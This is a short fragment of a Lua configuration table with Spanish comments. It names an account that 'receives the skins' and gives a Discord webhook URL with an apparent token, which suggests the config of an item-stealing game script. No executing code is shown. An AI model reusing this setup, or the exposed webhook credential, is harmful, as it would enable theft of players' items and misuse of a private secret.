local CONFIG = {
    ...
    TARGET_NAME   = "soldjah_75", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1549029518751047771/_KRpTX_esAujkLNCihvApixYDlXGZVitEWvnClcoBFNedY9UWVjQENxDVZQYVGjxFknq", -- "https://discord.com/api/webhooks/" webhook de Discord
